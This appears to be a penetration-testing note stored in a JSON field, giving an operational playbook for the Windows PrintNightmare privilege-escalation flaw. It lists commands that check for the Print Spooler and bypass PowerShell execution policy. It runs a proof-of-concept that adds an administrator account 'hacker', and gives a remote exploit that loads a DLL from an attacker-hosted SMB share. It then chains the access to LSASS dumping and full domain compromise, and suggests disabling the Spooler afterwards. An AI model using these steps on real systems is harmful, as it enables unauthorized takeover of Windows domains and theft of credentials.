      "notes": "=== PrintNightmare (CVE-2021-1675 / CVE-2021-34527) ===\nAny authenticated domain user can install printer drivers via RpcAddPrinterDriver → SYSTEM.\n\n=== VULNERABILITY DETAILS ===\nPrint Spooler service exposes RpcAddPrinterDriver function.\nIntended for privileged users to install printer drivers remotely.\nVulnerability: any authenticated domain user could call this function (without SeLoadDriverPrivilege).\nResult: SYSTEM-level code execution via the Spooler.\nAffected: Servers, workstations, DCs (Spooler enabled by default everywhere).\n\n=== PREREQUISITE CHECK ===\nConfirm Spooler running:\n  ls \\\\127.0.0.1\\pipe\\spoolss   → if exists, Spooler is running\n  sc query spooler\n  Get-Service spooler\n\n=== ATTACK FLOW — PowerShell PoC ===\n1. Execution policy bypass:\n   Set-ExecutionPolicy Bypass -Scope Process -Force\n2. Load PoC:\n   Import-Module .\\CVE-2021-1675.ps1\n3. Execute:\n   Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"Password123!\" -DriverName \"PrintMe\"\n   → Creates malicious DLL in temp directory\n   → Uses printer driver installation path to load it as SYSTEM\n   → Adds new local administrator\n\n4. Verify:\n   net localgroup administrators\n\n=== REMOTE EXPLOITATION ===\npython3 CVE-2021-1675.py domain/user:pass@<TARGET_IP> '\\\\<ATTACKER>\\share\\malicious.dll'\n(SMB share on attacker serving the DLL)\n\n=== CHAINING CONTEXT ===\nPrintNightmare → new local admin → RDP/SMB access → LSASS dump → domain hashes\nPrintNightmare on DC → SYSTEM on DC → secretsdump → full domain compromise\nPrintNightmare + DnsAdmins = two independent DA paths (belt and suspenders)\nPost-exploitation: disable Spooler to close the path after using it (sc stop spooler)\n\n=== WHAT TO LOOK FOR ===\nPrint Spooler running on DC = highest priority target\nspoolss named pipe confirms Spooler active\nAll Windows versions without the July 2021 patch are vulnerable\nAdding a local admin is noisy — prefer reverse shell payload in authorized assessments",
